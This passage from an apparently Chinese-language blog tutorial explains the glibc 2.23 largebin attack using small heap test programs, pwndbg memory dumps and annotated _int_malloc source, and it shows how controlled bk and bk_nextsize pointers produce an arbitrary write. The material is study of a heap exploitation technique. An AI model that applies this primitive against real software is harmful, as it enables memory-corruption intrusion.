class="line">   <span class="built_in">free</span>(p3);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);<span class="comment">//这里再申请一个是触发便利unsortedbin，使对应的chunk放入largebins中</span></span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;gcc -o test1 test1.c -g</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x602850 —▸ 0x602420 —▸ 0x602000 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602850 /* <span class="string">&#x27;P(`&#x27;</span> */</span><br><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:       0x00007ffff7dd1f58      0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:       0x0000000000602850      0x0000000000602000</span><br><span class="line">    					<span class="comment"># 这个指向在当前index下最大那一组的头节点	这个指向在当前index下最小那一组的头节点</span></span><br><span class="line">0x7ffff7dd1f88 &lt;main_arena+1128&gt;:       0x00007ffff7dd1f78      0x00007ffff7dd1f78</span><br><span class="line">0x7ffff7dd1f98 &lt;main_arena+1144&gt;:       0x00007ffff7dd1f88      0x00007ffff7dd1f88</span><br><span class="line">0x7ffff7dd1fa8 &lt;main_arena+1160&gt;:       0x00007ffff7dd1f98      0x00007ffff7dd1f98</span><br><span class="line">0x7ffff7dd1fb8 &lt;main_arena+1176&gt;:       0x00007ffff7dd1fa8      0x00007ffff7dd1fa8</span><br><span class="line">0x7ffff7dd1fc8 &lt;main_arena+1192&gt;:       0x00007ffff7dd1fb8      0x00007ffff7dd1fb8</span><br><span class="line">0x7ffff7dd1fd8 &lt;main_arena+1208&gt;:       0x00007ffff7dd1fc8      0x00007ffff7dd1fc8</span><br><span class="line">0x7ffff7dd1fe8 &lt;main_arena+1224&gt;:       0x00007ffff7dd1fd8      0x00007ffff7dd1fd8</span><br><span class="line">0x7ffff7dd1ff8 &lt;main_arena+1240&gt;:       0x00007ffff7dd1fe8      0x00007ffff7dd1fe8</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602850</span><br><span class="line">0x602850:       0x0000000000000000      0x0000000000000421</span><br><span class="line">0x602860:       0x0000000000602420      0x00007ffff7dd1f68#bk</span><br><span class="line">0x602870:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602890:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/10gx 0x602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000401#chunk A</span><br><span class="line">0x602010:       0x00007ffff7dd1f68      0x0000000000602420</span><br><span class="line">0x602020:       0x0000000000602850      0x0000000000602420#fd_nextsize --&gt; chunk C prev_size</span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000#bk_nextsize --&gt; chunk B prev_size</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x602420</span><br><span class="line">0x602420:       0x0000000000000000      0x0000000000000411#chunk B</span><br><span class="line">0x602430:       0x0000000000602000      0x0000000000602850</span><br><span class="line">0x602440:       0x0000000000602000      0x0000000000602850</span><br><span class="line">0x602450:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602460:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x602850</span><br><span class="line">0x602850:       0x0000000000000000      0x0000000000000421#chunk C</span><br><span class="line">0x602860:       0x0000000000602420      0x00007ffff7dd1f68</span><br><span class="line">0x602870:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602890:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<h3 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h3><p>这个目的是了解<strong>同index相同大小的chun</strong>k**的关系，和与libc_arena的关系</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">char</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>); <span class="comment">//gap</span></span><br><span class="line">   <span class="type">char</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="type">char</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span> - <span class="number">0x10</span>);</span><br><span class="line">   gap = <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">   <span class="built_in">free</span>(p1);</span><br><span class="line">   <span class="built_in">free</span>(p2);</span><br><span class="line">   <span class="built_in">free</span>(p3);</span><br><span class="line">   <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">   read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o test2 test2.c </span></span><br><span class="line"><span class="comment">//read的作用是阻塞程序执行，./test2 ,ps -a 看pid, gdb ,attach pid</span></span><br></pre></td></tr></table></figure>

<p>gdb调试：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x400-0x430: 0x602000 —▸ 0x602840 —▸ 0x602420 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x602000</span><br><span class="line">pwndbg&gt; x/20gx 0x7ffff7dd1f68</span><br><span class="line">0x7ffff7dd1f68 &lt;main_arena+1096&gt;:       0x00007ffff7dd1f58      0x00007ffff7dd1f58</span><br><span class="line">0x7ffff7dd1f78 &lt;main_arena+1112&gt;:       0x0000000000602000      0x0000000000602420</span><br><span class="line">0x7ffff7dd1f88 &lt;main_arena+1128&gt;:       0x00007ffff7dd1f78      0x00007ffff7dd1f78</span><br><span class="line">0x7ffff7dd1f98 &lt;main_arena+1144&gt;:       0x00007ffff7dd1f88      0x00007ffff7dd1f88</span><br><span class="line">0x7ffff7dd1fa8 &lt;main_arena+1160&gt;:       0x00007ffff7dd1f98      0x00007ffff7dd1f98</span><br><span class="line">0x7ffff7dd1fb8 &lt;main_arena+1176&gt;:       0x00007ffff7dd1fa8      0x00007ffff7dd1fa8</span><br><span class="line">0x7ffff7dd1fc8 &lt;main_arena+1192&gt;:       0x00007ffff7dd1fb8      0x00007ffff7dd1fb8</span><br><span class="line">0x7ffff7dd1fd8 &lt;main_arena+1208&gt;:       0x00007ffff7dd1fc8      0x00007ffff7dd1fc8</span><br><span class="line">0x7ffff7dd1fe8 &lt;main_arena+1224&gt;:       0x00007ffff7dd1fd8      0x00007ffff7dd1fd8</span><br><span class="line">0x7ffff7dd1ff8 &lt;main_arena+1240&gt;:       0x00007ffff7dd1fe8      0x00007ffff7dd1fe8</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602000</span><br><span class="line">0x602000:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602010:       0x0000000000602840      0x00007ffff7dd1f68</span><br><span class="line">0x602020:       0x0000000000602000      0x0000000000602000</span><br><span class="line"><span class="comment">#在相同index下没有其它大小的chunk，指向自身</span></span><br><span class="line">0x602030:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602040:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602840</span><br><span class="line">0x602840:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602850:       0x0000000000602420      0x0000000000602000</span><br><span class="line">0x602860:       0x0000000000000000      0x0000000000000000</span><br><span class="line"><span class="comment">#同样大小下除了头节点，其他的fd_nextsize和bk_nextsize为0</span></span><br><span class="line">0x602870:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602880:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000000602420</span><br><span class="line">0x602420:       0x0000000000000000      0x0000000000000401</span><br><span class="line">0x602430:       0x00007ffff7dd1f68      0x0000000000602840</span><br><span class="line">0x602440:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602450:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x602460:       0x0000000000000000      0x0000000000000000</span><br><span class="line">pwndbg&gt;    </span><br></pre></td></tr></table></figure>

<h2 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h2><p>从源码分析largebin_attack</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size) &#123;</span><br><span class="line">    <span class="comment">// 判断当前操作的chunk的size是不是等于largebin中最大的size</span></span><br><span class="line">    <span class="comment">/* Always insert in the second position. */</span></span><br><span class="line">    fwd = fwd-&gt;fd;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 这是largebin_attack的核心</span></span><br><span class="line">    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//##//addr2</span></span><br><span class="line">    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//##//addr2-&gt;fd_nextsize = victim</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bck = fwd-&gt;bk;<span class="comment">//##//addr1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (victim-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mark_bin(av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//##//addr2-&gt;fd = victim</span></span><br></pre></td></tr></table></figure>

<p>这是glibc2.23中3700行左右的代码，加<code>//##//</code>的是largebin_attack的核心</p>
<p>该段代码是从unsorted bin里取出未归位的large bin时可能会触发的代码。什么叫未归位？当free一个块时，如果chunk没有放到fastbin或者tcache，那么就直接放到unsorted bin里。当接下来malloc符合某些条件时，会遍历unsorted bin，并根据chunk的size把chunk给放到对应的bin里，比如放到large bin、small bin等。</p>
<p>fwd指向的是large bin的某个头结点，而victim指向的是unsorted bin里当前遍历到的这个chunk。</p>
<p>先不考虑前面的条件，假设程序执行到此处，而我们利用UAF或其他漏洞<strong>控制了fwd的bk和bk_nexsize指针分别为addr1、addr2</strong>，那么，我们代入图中计算，得：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">addr2-&gt;fd_nexsize = victim <span class="comment">//向addr2+0x18处写入victim的地址</span></span><br><span class="line">addr1-&gt;fd = victim <span class="comment">//向addr2+0x10处写入victim的地址</span></span><br></pre></td></tr></table></figure>

<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><strong>最终实现：往任意地址处写入一个堆地址（或一个大数）</strong></p>
<p><strong>那么怎么到达这里触发这些代码呢？</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line">_int_malloc (mstate av, <span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T nb;               <span class="comment">/* normalized request size */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="type">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">//这个 (nb) 是我们申请的大小，判断是不是在fastbin中，直接跳过</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (nb) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>) (get_max_fast ()))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);</span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);</span><br><span class="line">      mchunkptr pp = *fb;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          victim = pp;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))</span><br><span class="line">             != victim);</span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">            &#123;</span><br><span class="line">              errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">            errout:</span><br><span class="line">              malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">              <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          check_remalloced_chunk (av, victim, nb);</span><br><span class="line">          <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里如果符合smallbin执行，也跳过</span></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">            malloc_consolidate (av);</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              bck = victim-&gt;bk;</span><br><span class="line">	<span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">                &#123;</span><br><span class="line">                  errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                  <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">              set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">              bin-&gt;bk = bck;</span><br><span class="line">              bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//这里是关于largebin_attack的重点</span></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//遍历unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))<span class="comment">//从bk开始遍历</span></span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">            malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                             chunk2mem (victim), av);</span><br><span class="line">          size = chunksize (victim);<span class="comment">//获得当前要操作的chunk的size</span></span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line"><span class="comment">//判断smallbin，跳过</span></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line">            <span class="comment">//将victem从unsortedbin中移出来，这里是unsortedbin的核心</span></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)<span class="comment">//判断当前操作(victim)的size是否和我们申请的chunk的size一样</span></span><br><span class="line">            &#123;<span class="comment">//house of strom</span></span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;<span class="comment">//如果一样直接返回</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))<span class="comment">//如果这个size是smallbin中的则放入smallbin中</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span><span class="comment">//否则就会放入largebin中//****largebin****///</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);<span class="comment">//根据size获取index</span></span><br><span class="line">              bck = bin_at (av, victim_index);<span class="comment">//bck是获取对应bin的地址，如：main_arena+1096处</span></span><br><span class="line">              fwd = bck-&gt;fd;<span class="comment">//fwd是largebin中最大的那个chunk的头节点</span></span><br><span class="line">              </span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)<span class="comment">//这个是判断当前bin中有没有chunk</span></span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">                      <span class="comment">//判断当前操作的chunk的size是不是小于当前bin中最小的size</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)</span><br><span class="line">                          <span class="comment">//判断当前操作的chunk的size是不是小于当前bin中最大的size</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                          <span class="comment">//判断当前操作的chunk的size是不是等于当前bin中最大的size</span></span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;<span class="comment">//这是largebin_attack的核心</span></span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br></pre></td></tr></table></figure>

<ul>
